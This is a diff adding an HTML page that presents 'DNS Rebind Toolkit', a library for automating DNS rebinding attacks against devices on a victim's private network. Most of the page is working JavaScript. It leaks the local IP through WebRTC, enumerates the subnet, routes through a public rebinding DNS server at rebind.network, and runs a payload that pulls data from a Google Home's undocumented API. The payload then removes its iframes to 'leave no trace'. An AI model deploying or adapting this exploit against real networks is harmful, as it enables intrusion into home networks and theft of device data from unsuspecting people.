@@ -1,0 +1,73 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<title>DNS Rebind Toolkit</title>
+</head><body>DNS Rebind Toolkit<br/>
+DNS Rebind Toolkit is a utility library that automates the process of executing DNS rebinding attacks. Once you’ve written a JavaScript payload to target a specific service, DNS Rebind Toolkit can help you deploy that attack on a victim’s network.<br/>
+<ul><li>It uses a <a href="https://github.com/diafygi/webrtc-ips">WebRTC IP address leak</a>&nbsp;to discover the victim’s local IP address.</li>
+<li>It automates network subnet enumeration so that you can target devices even if you don’t know their IP addresses on the private network.</li>
+<li>It automates the DNS rebinding portion of the attack. You get a Promise that resolves once the rebind has finished.</li>
+<li>It uses whonow behind the scenes so that you don’t have to worry about the DNS server component of a DNS rebinding attack.</li>
+<li>It comes with several payloads for attacking common IoT devices and well-documented examples so that you learn to write your own exploits.</li>
+</ul>
+<br/>
+Launching an attack against a Google Home device on a 192.168.1.1/24 subnet is as easy as embedding a code snippet in and index.html page.<br/>
+<br/>
+// JS in index.html<br/>
+DNSRebindAttack.getLocalIPAddress()<br/>
+.then(ip =&gt; launchRebindAttack(ip))<br/>
+.catch(err =&gt; {<br/>
+&nbsp; &nbsp; console.error(err)<br/>
+&nbsp; &nbsp; // Looks like our nifty WebRTC leak trick didn't work <br/>
+&nbsp; &nbsp; // No biggie, most home networks are 192.168.1.1/24 anyway.<br/>
+&nbsp; &nbsp; launchRebindAttack('192.168.1.1')<br/>
+})<br/>
+<br/>
+function launchRebindAttack(localIp) {<br/>
+<br/>
+&nbsp; &nbsp; // convert 192.168.1.1 into array from 192.168.1.0 - 192.168.1.255<br/>
+&nbsp; &nbsp; const first3Octets = localIp.substring(0, localIp.lastIndexOf('.'))<br/>
+&nbsp; &nbsp; const ips = [...Array(256).keys()].map(octet =&gt; `${first3Octets}.${octet}`)<br/>
+<br/>
+&nbsp; &nbsp; // The first argument is the domain name of a publicly accessible<br/>
+&nbsp; &nbsp; // whonow server (https://github.com/brannondorsey/whonow).<br/>
+&nbsp; &nbsp; // I've got one running on port 53 of rebind.network you can to use.<br/>
+&nbsp; &nbsp; // Google Home's undocumented HTTP API server runs on port 8008<br/>
+&nbsp; &nbsp; const rebind = new DNSRebindAttack('rebind.network', 8008)<br/>
+<br/>
+&nbsp; &nbsp; // Launch a DNS Rebind attack, spawning 255 iframes<br/>
+&nbsp; &nbsp; rebind.attack(ips, '127.0.0.1', 'payload/google-home.html')<br/>
+}<br/>
+<br/>
+<br/>
+That index.html file will launch the attack, spawning one iframe for each IP address in the array passed to rebind.attack(…). Each iframe embeds payloads/google-home.html with the following JavaScript snippet:<br/>
+<br/>
+// JS in payloads/google-home.html<br/>
+attack()<br/>
+.then((json) =&gt; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log('The attack was successful! Here is the JSON it exfiltrated:')<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.log(json)<br/>
+&nbsp; &nbsp; &nbsp; },<br/>
+&nbsp; &nbsp; &nbsp; err =&gt; {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; // there probably isn't even a machine with this IP address...<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; console.error('No Google Home found at this IP ')<br/>
+&nbsp; &nbsp; &nbsp; }<br/>
+)<br/>
+// remove the iframe from index.html once the attack is complete. <br/>
+// Leave no trace ;)<br/>
+.then(() =&gt; DNSRebindNode.destroy())<br/>
+<br/>
+async function attack() {<br/>
+&nbsp; &nbsp; <br/>
+&nbsp; &nbsp; // a helper function that returns some fetch() options configured with<br/>
+&nbsp; &nbsp; // certain useful headers<br/>
+&nbsp; &nbsp; const getOptions = DNSRebindNode.fetchOptions()<br/>
+&nbsp; &nbsp; <br/>
+&nbsp; &nbsp; try {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; const opts = { fetchOptions: getOptions }<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; return await DNSRebindNode.rebind(`http://${location.host}/setup/eureka_info`, opts).then(data =&gt; data.json())<br/>
+&nbsp; &nbsp; } catch (err) {<br/>
+&nbsp; &nbsp; &nbsp; &nbsp; return Promise.reject(err)<br/>
+&nbsp; &nbsp; }<br/>
+}</body></html>
